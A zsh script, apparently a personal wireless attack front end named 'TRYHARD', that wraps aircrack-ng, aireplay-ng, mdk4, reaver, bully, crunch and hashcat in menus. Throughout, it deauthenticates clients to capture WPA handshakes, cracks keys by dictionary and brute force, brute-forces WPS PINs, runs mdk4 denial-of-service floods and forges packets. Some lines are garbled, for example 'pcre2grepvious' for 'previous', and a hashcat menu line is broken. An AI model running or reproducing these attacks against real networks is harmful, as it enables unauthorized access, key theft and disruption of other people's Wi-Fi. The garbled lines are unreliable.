#!/bin/zsh

setopt no_case_match extended_glob;
function box () {
  ((# == 0)) && return 0;
  local a d h B T H tl tr bl br th bh lv rv r w; integer s; s=1;
  while getopts 's:h:B:T:H:' a; do case $a in
    (s) # line style
      ((OPTARG >= 1 && OPTARG < 5)) && s=$OPTARG;;
    (h) # header
      h=$OPTARG;;
    (B) # box color
      B="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
      [[ $OPTARG =~ i ]] && B="${B};7";
      [[ $OPTARG =~ b ]] && B="${B};1";
      B="${B}m";;
    (T) # text color
      T="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
      [[ $OPTARG =~ i ]] && T="${T};7";
      [[ $OPTARG =~ b ]] && T="${T};1";
      T="${T}m";;
    (H) # header color
      H="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
      [[ $OPTARG =~ i ]] && H="${H};7";
      [[ $OPTARG =~ b ]] && H="${H};1";
      H="${H}m";;
  esac; done;

  tl=(┏ ┌ ╔ ⡏); tl=${tl[$s]}; # top left
  bl=(┗ └ ╚ ⣇); bl=${bl[$s]}; # bottom left
  tr=(┓ ┐ ╗ ⢹); tr=${tr[$s]}; # top right
  br=(┛ ┘ ╝ ⣸); br=${br[$s]}; # bottom right
  th=(━ ─ ═ ⠉); th=${th[$s]}; # top horizontal
  bh=(━ ─ ═ ⣀); bh=${bh[$s]}; # bottom horizontal
  lv=(┃ │ ║ ⡇); lv=${lv[$s]}; # left vertical
  rv=(┃ │ ║ ⢸); rv=${rv[$s]}; # right vertical
  r='\033[;0m';
  # box inside width
  w=0; for a in $@[OPTIND,-1]; do ((${(c)#a} > w)) && w=${(c)#a}; done; 
  ((${+h:+1} && $#h > w)) && w=$#h && ((w+=2)); ((w+=2));

  ((w + 2 > COLUMNS)) && {
    # FIXME; IF HEADER MULTI ROW OR LONGER THAN COLUMNS ... ELSE
    ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(COLUMNS-2-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(COLUMNS-2-$#h)/2+$#h+COLUMNS-2-($#h+COLUMNS-2)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.COLUMNS-3..$th.)th} $tr;
    for a in $@[OPTIND,-1]; do 
      for d in ${(f)"$(fmt -w $COLUMNS <<< $a)"}; do
        printf '%s %b%s%b %s\n' $lv $r$T ${(r.COLUMNS-4.. .)d} $r$B $rv; 
      done;
    done;
    printf '%s%s%s%b\n' $bl ${(pr.COLUMNS-2..$bh.)bh} $br $r;
  } || {
    ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(w-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(w-$#h)/2+$#h+w-($#h+w)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.w-1..$th.)th} $tr;
    for a in $@[OPTIND,-1]; do printf '%s %b%s%b %s\n' $lv $r$T ${(r.w-2.. .)a} $r$B $rv; done;
    printf '%s%s%s%b\n' $bl ${(pr.w..$bh.)bh} $br $r;
  };
}

function menu () {
  typeset m t a;
  while getopts 'm:t:' a; do case $a in
  (m) 
    m="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
    [[ $OPTARG =~ i ]] && m="${m};7";
    [[ $OPTARG =~ b ]] && m="${m};1";
    m="${m}m";;
  (t)
    t="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
    [[ $OPTARG =~ i ]] && t="${t};7";
    [[ $OPTARG =~ b ]] && t="${t};1";
    t="${t}m";;
  esac; done;
  for a in $@[OPTIND,-1]; do printf '%b%4s    %b%s%b\n' "${m:-\033];0m}" "${a%% *}" "${t:-\033[;0m}" "${a#* }" '\033[;0m'; done;
}

function select-cap () {
  caps=(${(f)"$(printf '%s\n' ${wifiDir}/*.cap)"}) &>/dev/null;
  caps+=(${(f)"$(printf '%s\n' ${t}/*.cap)"}) &>/dev/null;
  ((${#caps} == 0)) && read -sk1 '?No .cap files found. ' && unset caps && return 1;
  ((${#caps} > 1)) && {
    cap="$(stat -c '%W %n' ${caps} | sort -r -k 1 | cut -f2- -d ' ' | fzy -l $LINES -p 'select cap file> ')";
    [[ ! -f  ${cap} ]] && read -sk1 "?${cap}: File does not exist. " && unset cap && return 1;
  } || { 
    cap=${caps[1]}; 
  };
}

function switch-mode () {
  local a d;
  [[ ! ${interface} =~ '^\S+mon\d*$' ]] && {
    interface=$(airmon-ng start ${interface} | perl -ne 's/^\s*\(\w+ monitor mode vif enabled for \[\w+\]'${interface}' on \[\w+\](\w+)\)$/$1/ && print') && {
      mode=monitor;
    } || {
      d=(${(f)"$(iw dev | pcre2grep -Mi -o1 -o2 'interface (\S+)[\s\S]+?type monitor')"}); 
      for a in ${d}; do 
        airmon-ng stop ${a} &>/dev/null; 
      done; 
      switch-mode || return 1; 
    };
  } || {
    interface=$(airmon-ng stop ${interface} | perl -ne 's/^\s*\(\w+ station mode vif enabled on \[\w+\](\w+)\)$/$1/ && print') && {
      mode=managed;
    } || { 
      return 1; 
    };
  };
}

function select-network () {
  ((! ${+essid})) || [[ $(read -seq '?select another network? ') = y ]] && true || return 0;

  local l s d;
  ls $(pwd)/dump* &>/dev/null && {
    [[ $(read -seq '?Use pcre2grepvious dump? ') != y ]] && {
      dump=$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8);
      [[ ${mode} != monitor ]] && switch-mode;
    } || {
      local a;
      dump=$(fzy -l $LINES <<< ${(F)"$(ls -1 $(pwd)/dump* | cut -d - -f 1)"});
    };
  } || {
      dump=$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8);
      [[ ${mode} != monitor ]] && switch-mode;
  };
  ((${+a})) || airodump-ng -w ${dump} ${interface}; clear;
  l=$(wc -l ${dump}-01.kismet.csv | awk '{print $1}');
  s=$(awk 'BEGIN {FS=";"}; {printf "%-8s%-32s%-24s%-24s%-8s%-8s\n", $1, $3, $4, $8, $6, $22}' ${dump}-01.kismet.csv | tail -n +2 | sort -n -r -k 6 | fzy -l $LINES -p 'Network ESSID                           BSSID                   Encryption              Channel BestQuality> ' | awk '{print $1}') || return 1;
  ((s += 1));
  d=(${(s.;.)"$(head -n $s ${dump}-01.kismet.csv | tail -n 1)"});
  essid=${d[3]};
  bssid=${d[4]};
  channel=${d[5]};
  security=${d[7]};
  power=${d[19]};
  clients=(${(f)"$(pcre2grep -io1 "^([a-f0-9:]{17}), .+, ${bssid}," ${dump}-01.csv)"});
}

function select-interface () {
  local d;
  d=(${(f)"$(iw dev | pcre2grep -Mi -o1 -o2 'interface (\S+)[\s\S]+?type( \w+)')"});
  if (($#d == 0)); then
    read -sk1 '?No wireless devices found. ' && return 2; 
  elif (($#d > 1)); then
    local s=$(printf '%s\n' $d | fzy -l $LINES -p 'select interface> '); 
    interface=${s% *}; mode=${s#* };
  else
    interface=${d% *}; mode=${d#* }; 
  fi;
}

function aircrack-pmk-attack () {
  select-network; ! ((${+cap})) && { select-cap || return 1; };
  local a c s sp p w wl q;
  ! wl=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.))"}) &>/dev/null && { 
    read -sk1 '?Nothing found. '; return 1; 
  } || {
    wl=(${(f)"$(fzf -i -m --reverse --prompt 'select 1-2 wordlists> ' <<< ${(F)wl})"});
    for w in ${wl}; do [[ ! -f ${w} ]] && read -sk1 "?${w}: Does not exist. " && return 1; done;
  };
  for w in ${wl}; do
    clear;
    s=$(du -B 1 ${w} | pcre2grep -o '^(\d+)');
    ((s > 20971520)) && {
      ((s /= 20971520));
      for q in {0..$((s-1))}; do gate $s $q < ${w} > x${q}${w}; done;
      # split -d -n ${s} ${w} x; 
      sp=(${(f)$(printf '%s\n' ./x*(.))});
      for s in ${sp}; do
        while true; do
          (($(jobs | wc -l) < 32)) && {
            { { airolib-ng ${s}-DB --import passwd ${s}; rm ${s}; airolib-ng ${s}-DB --import essid ${essid}; airolib-ng ${s}-DB --batch; exit; } &; }; break;
          } || sleep 60;
        done;
      done;
    } || {
      airolib-ng ${wl}-DB --import passwd ${wl}; airolib-ng ${wl}-DB --import essid ${essid}; airolib-ng ${wl}-DB --batch;
    };
    while (($(jobs | wc -l) > 0)); do sleep 60; done;
  done;
  # c=${"$(printf '%s\n' ~/dcs/wifi/**/*.cap(.) /mnt/**/*.cap(.) | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -l $LINES -p 'select cap file> ')"};
  for a in ./*-DB(.); do aircrack-ng -r ${a} ${cap}; done;
  # aircrack-ng -r "$(printf '%s,' ./*-DB(.))" ${cap};
}

function capture-packets () {
  [[ ${mode} != monitor ]] && switch-mode; clear;
  menu -m 1b -t 2 '1 All traffic' '2 Specific channel' '3 Specific channel and BSSID' '* return' ' ';
  case $(read -sek1 '?> ') in 
    (1) airodump-ng -w $(pwd)/dump$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
    (2) airodump-ng -c $(read -e '?[1--17]> ') -w $(pwd)/dump$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
    (3) select-network; { airodump-ng -c ${channel} -d ${bssid} -w ${essid} ${interface}; } &;
      ((${#clients} == 0)) && {
        { aireplay-ng -0 64 -a ${bssid} ${interface}; exit; } &;
      } || {
        local client; for client in ${clients}; do 
          { aireplay-ng -0 64 -a ${bssid} -c ${client} ${interface}; exit; } &; 
        done; 
      };;
    (*) return;;
  esac;
}

function aircrack-dict-attack () {
  local wl s;
  [[ $(read -seq '?resume dictionary attack? ') = y ]] && {
    s+=(${(f)"$(printf '%s\n' ${t}/*.sesh(.bak)#(.oc))"}) &>/dev/null;
    s+=(${(f)"$(printf '%s\n' ${wifiDir}/*.sesh(.bak)#(.oc))"}) &>/dev/null;
    (($#s!=0)) && [[ -f "$(fzy -l $LINES <<< ${(F)s})" ]] && aircrack-ng -R ${s};
    return;
  }; 
  printf '\n';

  select-network; select-cap;
  wl=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.))"}); ((${#wl} == 0)) && read -sk1 '?Nothing found. ' && return 1;
  wl=(${(f)"$(fzf -i -m --reverse --prompt 'select wordlists> ' <<< ${(F)wl})"});

  { sleep 30; while ps -C aircrack-ng &>/dev/null; do sleep $((60 * 10)); cp ${essid}.sesh ${essid}.sesh.bak; done; exit; } &;
  aircrack-ng -N ${essid}.sesh -l ${essid}.key -w "$(printf '%s,' $wl)" -b ${bssid} ${cap};
}

function state () {
  box -s 1 -H 5b -B 4 -T 3b -h ${1:-TRYHARD} \
  "${(r.17.. .)$(<<< interface:)}${(r.25.. .)interface:--}" \
  "${(r.17.. .)$(<<< mode:)}${(r.25.. .)mode:--}" \
  "${(r.17.. .)$(<<< ESSID:)}${(r.25.. .)essid:--}" \
  "${(r.17.. .)$(<<< BSSID:)}${(r.25.. .)bssid:--}" \
  "${(r.17.. .)$(<<< security:)}${(r.25.. .)security:--}" \
  "${(@l.25..client:          .r.9.. .)clients:--               }" \
  "${(r.17.. .)$(<<< channel:)}${(r.25.. .)channel:--}" \
  "${(r.17.. .)$(<<< power:)}${(r.25.. .)power:--}";
}

function mdk4-attack () {
  while true; do
    clear; state MDK4;
    menu -m 1b -t 2 \
      '1 Beacon Flooding' \
      '. Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers\!' \
      '2 Authentication Denial-of-Service' \
      '. Sends authentication frames to all APs found in range. Too many clients can freeze or reset several APs.' \
      '3 SSID Probing and Bruteforcing' \
      '. Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range. Bruteforcing of hidden SSIDs with or without a wordlist is also available.' \
      '4 Deauthentication and Disassociation' \
      '. Sends deauthentication and disassociation packets to stations based on data traffic to disconnect all clients from an AP.' \
      '5 Michael Countermeasures Exploitation' \
      '. Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs.' \
      '6 EAPOL Start and Logoff Packet Injection' \
      '. Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages.' \
      '7 Attacks for IEEE 802.11s mesh networks' \
      '. Various attacks on link management and routing in mesh networks. Flood neighbors and routes, create black holes and divert traffic\!' \
      '8 WIDS Confusion' \
      '. Confuse/Abuse Intrusion Detection and Pcre2grepvention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs.' \
      '9 Packet Fuzzer' \
      '. A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful\!' \
      'n select network' \
      'm switch interface mode' \
      '* return';
    case $(read -sek1 '?> ') in
      (1) mdk4 wlp3s0mon b -n ${essid} -c ${channel} -s 1024 -h;;
      (2) mdk4 wlp3s0mon a -a ${bssid} -m;;
      (3) mdk4 wlp3s0mon p -t ${bssid} -s 1024 -b nul -s 2048;;
      (4) mdk4 wlp3s0mon d -B ${bssid} -c ${channel};;
      (5) mdk4 wlp3s0mon m -t ${bssid} -w 1 -n 1024 -s 1024;;
      (6) mdk4 wlp3s0mon e -t ${bssid} -s 1024 -l;;
      # (7) mdk4 wlp3s0mon s -f 5 -s 4096 -n ${meshid};;
      (8) mdk4 wlp3s0mon w -e ${essid} -c ${channel} -w 512;;
      (9) mdk4 wlp3s0mon f -s a -m stcd -p 512;;
      (n) select-network;;
      (*) break;;
    esac;
  done;
}

function aircrack-crunch-attack () {
  select-network; select-cap;
  menu -m 1b -t 2 \
    '1  type in characters (in order of lower upper digit symbol) manually' \
    '2  use pcre2grepdefined character set' \
    '*  return' ' ';
  case $(read -sek1 '?> ') in
    (1) crunch $(read -e '?min len> ') $(read -e '?max len> ') $(read -e '?charset> ') | aircrack-ng ${cap} -l ${essid}.key -b ${bssid} -w-;;
    (2) crunch $(read -e '?min len> ') $(read -e '?max len> ') -f ~/src/crunch/charset.lst $(perl -ne '/^[^v]+\s+=\s+\[.+\]$/ && print' < ~/src/crunch/charset.lst | fzy -p 'select charset> ' -l $LINES | awk '{print $1}') | aircrack-ng ${cap} -l ${essid}.key -b ${bssid} -w-;;
    (*) return;;
  esac;
}

function bully-reaver-attack () {
  clear; local sesh;
  sesh=${(f)$(printf '%s\n' /mnt/**/*.reaver.sesh(.oc))} &>/dev/null && [[ $(read -seq '?resume reaver session? ') = y ]] && {
    sesh="$(fzy -l $LINES -p 'select sesh> ' <<< ${(F)sesh})"; [[ -f ${sesh} ]] && reaver -R ${sesh};
  } || {
    state 'BULLY/REAVER';
    menu -m 1b -t 2 \
      '1 bully pindb / custompin' \
      '2 bully pixiedust' \
      '3 bully bruteforce' \
      '4 reaver pindb / custompin' \
      '5 reaver pixiedust' \
      '6 reaver bruteforce' \
      '7 reaver nullpin' \
      '8 select network' \
      '* return' ' ';
    case $(read -sek1 '?> ') in
      (1) bully ${interface} -b ${bssid} -c ${channel} -L -F -B -v -p;;
      (2) bully ${interface} -b ${bssid} -c ${channel} -d -v;;
      (3) bully ${interface} -b ${bssid} -c ${channel} -S -L -F -B -v;;
      (4) reaver -i ${interface} -b ${bssid} -c ${channel} -L -f -N -g 1 -d 1 -vvv -p;;
      (5) reaver -i ${interface} -b ${bssid} -c ${channel} -K 1 -N -vvv;;
      (6) reaver -i ${interface} -b ${bssid} -c ${channel} -L -f -N -d 1 -vvv;;
      (7) reaver -i ${interface} -b ${bssid} -c ${channel} -L -f -N -g 1 -d 1 -vvv -p '';;
      (8) select-network;;
      (*) return;
    esac;
  };
}

function chopchop-attack() { # WEP ICV Attack
  select-network; until [[ ${security} =~ tkip ]]; do read -sk1 '?Select a network with TKIP> '; select-network; done; (($? != 0)) && return 1;
  airmon-ng start ${interface} ${channel};
  ! local m=$(< /sys/class/net/${interface}/address) && read -sk1 "?${interface}: No MAC address found." && return 1;

  aireplay-ng -4 -b ${bssid} -h ${m} ${interface} | tee -a ${t}/${essid}-chopchopoutput.txt;
  packetforge-ng -0 -a ${bssid} -h ${m} -k 255.255.255.255 -l 255.255.255.255 -y ${t}/replay_dec-*.xor -w ${t}/${essid}-chopchop.cap;
  [[ -f ${t}/${essid}-chopchop.cap ]] && aireplay-ng -2 -F -r ${t}/${essid}-chopchop.cap ${interface} || { read -sk1 '?No chopchop.cap file found.' && return 1; };
  airmon-ng stop ${interface};
}

function hashcat-attack () {
  local a c f h m o r t w z;
  o+=(--session="$(date +'%F-%T').hashcat" --hwmon-temp-about=96 --workload-profile=3 --opencl-device-types=1);

  r=(${(f)"$(printf '%s\n' /mnt/**/*.hashcat(.oc))"}) &>/dev/null;
  r+=(${(f)"$(printf '%s\n' ${wifiDir}/**/*.hashcat(.oc))"}) &>/dev/null; ((${#r} == 0)) && unset r;

  while true; do clear;
    c="hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+${h} }${w:+${w} }${m:+${m} }";
    box -s 1 -H 5b -B 4 -T 3b -h HASHCAT \
      "${(r.17.. .)$(<<< hccapx/hashfile/hash:)}${h:--}";
      "${(@l.37..wordlist:  .r.2.. .)w:--}";
    menu -m 1b -t 2 \
      "cmd: ${c}" \
      '0 resume session' \
      '1 select attack mode' \
      '2 select wordlist(s)' \
      '3 select .hccapx/hash file' \
      '4 select mask' \
      '5 select hash-type' \
      '6 options' \
      '7 run command' \
      'q return' ' ';
    case $(read -sek1 '?> ') in
      (0) 
        ((${+r})) && hashcat --restore="$(fzy -l $LINES -i -p 'select session> ' <<< ${(F)r})" || read -sk1 '?No hashcat sessions found. ';;
      (1) 
        menu -m 1b -t 2 \
          '1 wordlist' \
          '2 wordlist permutations' \
          '3 brute-force' \
          '4 hybrid wordlist + mask' \
          '5 hybrid mask + wordlist' \
          '* return' ' ';
        case $(read -sek1 '?select attack mode> ') in
          (1) a=0;;
          (2) a=1;;
          (3) a=3;;
          (4) a=6;;
          (5) a=7;;
        esac;;
      (2) 
        w=(${(f)"$(printf '%s\n' ${wordlistDir}/**/*(.))"});
        while ((${#w} > 2)); do clear; printf '%s\n' ${w} ''; wl[$(read -e '?select wordlist entry # to remove> ')]=(); done && clear;
        ((${#w} == 2)) && {
          printf '%s\n' ${w} ''; 
          [[ $(read -seq '?reverse wordlist order for permutation attack? otherwise only first will be used> ') = y ]] && \
            w[3]=${w[2]} && w[2]=${w[1]} && w[1]=${w[3]} && w[3]=(); 
        } || { 
          ((${#w} == 1)) && [[ $(read -seq '?use same wordlist twice for permutation attack? ') = y ]] && w[2]=${w[1]}
        };;
      (3) 
        menu -m 1b -t 2 '1 Select .cap to convert, or .hccapx' '2 Input hash file' '* return' ' ';
        case $(read -sek1 '?> ') in
          (1) f=(${(f)"$(printf '%s\n' ${wifiDir}/*.(hc)#cap(x)#(.) /mnt/**/*.(hc)#cap(x)#(.))"});
            [[ -n ${f} ]] && f="$(printf '%s\n' ${f} | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -l $LINES -p 'select file> ')";
            [[ ${f} =~ '\.hccapx$' ]] && h=${f}|| { h="$(dirname ${f})/$(basename ${f} cap)hccapx"; cap2hccapx ${f} ${h} || unset h f; };;
          (2) read -sk1 '?FIXME...';;
        esac;;
      (4) 
        printf '%s\n' 'Mask builtin charsets' '?l = abcdefghijklmnopqrstuvwxyz' '?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ' '?d = 0123456789' '?h = 0123456789abcdef' '?H = 0123456789ABCDEF' '?s = «space»!"#$%&()*+,-./:;<=>?@[\]^_`{|}~<apostrophe>' '?a = ?l?u?d?s' '?b = 0x00 - 0xff';
        read 'm?Input mask> ';;
      (5) 
        t=$(printf '%s\n' ${(f)"$(hashcat --help | perl -ne 's/^\s+(\d+).+?(\S*WPA\S*).*/$1\t\t$2 / && print' | fzy -l $LINES -p 'select hash-type> ' | awk '{printf $1}')"});;
      (6) 
        while true; do clear; printf '%s\n' "Current options: ${o}" '   1    add option' '   2    remove option' '   *    return';
          case $(read -sek1 '?> ') in
            (1) o+=(${(f)"$(read -e '?input option> ')"});;
            (2) o[$(read -e '?number of option to remove> ')]=() || true;;
          esac;
        done;;
      (7) 
        ! ((${+a} || ${+t} || ${+h})) && read -sk1 '?Attack mode, hash type, or hccapx/hash file not specified!' || {
          hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} }--speed-only;
          [[ $(read -seq "?Run \033[32;1m${c}\033[0m)? ") = y ]] && hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} }; 
        };;
      (*) break;;
    esac;
  done;
}

function wep-wash-attack () {
  local d;
  clear; [[ ${mode} != monitor ]] && switch-mode; 
  d=(${(s. .)"$(wash -i ${interface} | fzf -i +m --reverse)"});
  ((${bssid} != ${d[1]})) && { bssid=${d[1]}; essid=${d[7]}; channel=${d[2]}; power=${d[3]}; security="WPS ${d[4]}, ${d[5]} lock, ${d[6]}"; unset clients; };
  bully -i ${interface} -b ${bssid} -c ${channel} -l 40;
}

function quit () {
  cd ~; trap - QUIT; [[ ${mode} != managed ]] && switch-mode;
  (( $(jobs | wc -l) != 0 )) && kill -9 $(jobs -p | awk '{printf $3}');
  # rmdir /mnt/* &>/dev/null;
  unset essid bssid mode channel power interface security cap caps;
  setopt nomatch;
}


function () {
  wordlistDir=~/dcs/wordlists;
  wifiDir=~/dcs/wifi;
  # t=$(mktemp -d /mnt/tryhard.XXXX); cd $t;
  t=/mnt/tryhard; mkdir -p ${t}; cd ${t};
  airmon-ng check kill;
  select-interface;
  trap 'quit; clear;' QUIT;
  while true; do
    clear; state;
    menu -m 1b -t 2 \
      '1 airmon + aireplay capture packets (+ deauth)' \
      '2 aircrack pmk attack' \
      '3 aircrack dictionary attack' \
      '4 aircrack + crunch bruteforce attack' \
      '5 mdk4 attacks' \
      '6 bully / reaver attacks' \
      '7 hashcat attacks' \
      '8 wash WPS-enabled WEP attack' \
      '9 chopchop attack' \
      'i select interface' \
      'm switch interface mode' \
      'n select network' \
      'q quit' ' ';
    case $(read -sek1 '?> ') in
      (1) capture-packets;;
      (2) aircrack-pmk-attack;;
      (3) aircrack-dict-attack;;
      (4) aircrack-crunch-attack;;
      (5) mdk4-attack;;
      (6) bully-reaver-attack;;
      (7) hashcat-attack;;
      (8) wep-wash-attack;;
      (9) chopchop-attack;;
      (m) switch-mode;;
      (n) select-network;;
      (i) select-interface;;
      (q) break;;
    esac;
  done;
  quit;
}